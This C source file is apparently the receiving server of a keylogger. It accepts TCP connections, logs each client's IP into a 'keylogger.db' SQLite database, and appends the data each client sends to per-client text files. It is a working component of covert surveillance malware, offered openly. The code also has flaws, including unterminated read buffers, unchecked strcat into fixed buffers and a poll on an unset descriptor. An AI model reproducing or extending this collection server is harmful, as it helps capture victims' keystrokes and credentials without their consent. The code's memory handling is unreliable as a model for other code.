#include <errno.h>
#include <fcntl.h>
#include "server.h"
#include "../database/database.h"

int			init_socket(nfds_t *reuse)
{
  struct addrinfo	hints, *resinfo = NULL;
  int			sock = -1;

  memset(&hints, 0, sizeof(struct addrinfo));
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags = AI_PASSIVE | AI_ADDRCONFIG;
  hints.ai_protocol = 0;
  if (getaddrinfo(NULL, PORT, &hints, &resinfo) != 0)
    err(3, "Getaddrinfo error");
  if ((sock = socket(resinfo->ai_family, resinfo->ai_socktype, resinfo->ai_protocol)) < 0)
    err(3, "Socket error");
  if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, reuse, sizeof(*reuse)) == -1)
    err(3, "Setsockopt error");
  if (bind(sock, resinfo->ai_addr, resinfo->ai_addrlen) != 0)
    err(3, "Bind error");
  freeaddrinfo(resinfo);
  return (sock);
}

void server(struct sockaddr_in *addr, sqlite3 *db) {
  socklen_t socklen= sizeof(struct sockaddr_in);
  int		sock_fd;
  int		io= 1;
  int		new_fd, n;
  nfds_t	reuse = 1;
  char		buffer[BUFFSIZE];
  struct pollfd fds[200];
  int num_client= 1;
  char addr_store[20];
  FILE *file;

  memset(&addr_store, 0, sizeof(addr_store));
  memset(&buffer, 0, sizeof(buffer));
  sock_fd = init_socket(&reuse);
  memset(fds, 0, sizeof(fds));
  fds[0].events= POLLIN;
  if(!listen(sock_fd, 100)) {
    if(poll(fds, reuse, 1000) < 0)
      perror("poll error");
  }
  else
    printf("%d\n", sock_fd);
  while(1) {
    fds[0].fd = sock_fd;
    fds[0].events = POLLIN;
    ioctl(fds[0].fd, FIONBIO, &io);
    if (poll(fds, reuse, 1000000) < 0)
      perror("Poll error");
    for(nfds_t i = 0; i < reuse; i++) {
      if(fds[i].revents & POLLNVAL)
	continue;
      
      if (fds[i].revents & POLLERR) {
	close(fds[i].fd);
	continue;
      }
      if(fds[i].revents == POLLHUP || fds[i].revents == POLLERR) {
	close(fds[i].fd);
	continue;
      }
      else if (fds[i].revents == 0)
        continue;
      if (fds[i].revents != POLLIN && fds[i].revents != POLLPRI) {
        perror("pollin error");
      }

      if (fds[i].fd == fds[0].fd) {
      	do {
          new_fd = accept(fds[0].fd, (struct sockaddr*)&addr[i], &socklen);
	  printf("%s\n", inet_ntoa(addr[i].sin_addr));
          if (new_fd == -1)
             break;
	  char name_client[20]= "client ";
	  strcat(name_client, itoa(num_client));
	  create_clients(db, inet_ntoa(addr[i].sin_addr), name_client);
	  create_data(db, 1, num_client, buffer);
	  research_data(db, num_client);
          num_client++;
	  //printf("new client fd = %d\n", new_fd);
	  fds[reuse].fd = new_fd;
          fds[reuse].events = POLLIN;
          reuse++;
	  printf("sin addr %s\n", inet_ntoa(addr[i].sin_addr));
	  printf("addr store %s\n", addr_store);
	  strncpy(addr_store, inet_ntoa(addr[i].sin_addr), 20);
	  memset(buffer, 0, 256);
        } while (new_fd != -1);
      }
      else {
	while((n= read(fds[i].fd, buffer, 256)) > 0) {
	  char link[50]= "dataSent_byClient";
	  strcat(link, itoa(num_client));
	  strcat(link, ".txt");
	  file= fopen(link, "a");
	  if(file == NULL)
	    err(1, "Pb with fopen dataSent_byClient");

	  if(fprintf(file, "%s\n", buffer) < 0)
	    err(1, "Pb with fprintf");

	  if(fclose(file) != 0)
	    err(1, "Pb with close");

	  fcntl(fds[i].fd, F_SETFL, O_NONBLOCK);
	  save_data("\n\n");
	  save_data(buffer);
	  printf("while before data sent: %s %d\n", addr_store, fds[i].fd);
	  //printf("Data sent: %s\n", buffer);
	  memset(buffer, 0, 256);
	}

	if(n < 0 && (errno != EAGAIN && errno != EWOULDBLOCK))
	  close(fds[i].fd);
	else
	  continue;
      }
    }
  }
}

void sigint_handler(int sig) {
  warnx("Get signal %d, dying", sig);
  _exit(sig);
}

int main() {
  sqlite3 *keylogger;
  int res= sqlite3_open("../database/keylogger.db", &keylogger);
  if(res) {
    perror("can't succeed\n");
    exit(0);
  }
  else
    printf("connection success\n");
  struct sockaddr_in *addr= calloc(100, sizeof(struct sockaddr_in));
  signal(SIGINT, sigint_handler);
  server(addr, keylogger);
  free(addr);
  sqlite3_close(keylogger);
  return 0;
}
